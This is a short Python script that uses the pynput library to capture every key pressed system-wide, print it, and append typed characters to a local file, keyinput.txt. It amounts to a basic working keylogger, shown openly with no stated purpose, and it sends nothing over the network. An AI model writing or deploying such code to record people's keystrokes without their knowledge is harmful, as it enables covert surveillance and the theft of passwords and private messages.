from pynput import keyboard


def pressedKey(key):
    print(str(key))     # gaurantee key is converted to string
    with open("keyinput.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error")


# Main Method
if __name__ == "__main__":
    listener = keyboard.Listener(on_press = pressedKey)
    listener.start()        # starts capturing key events
    input()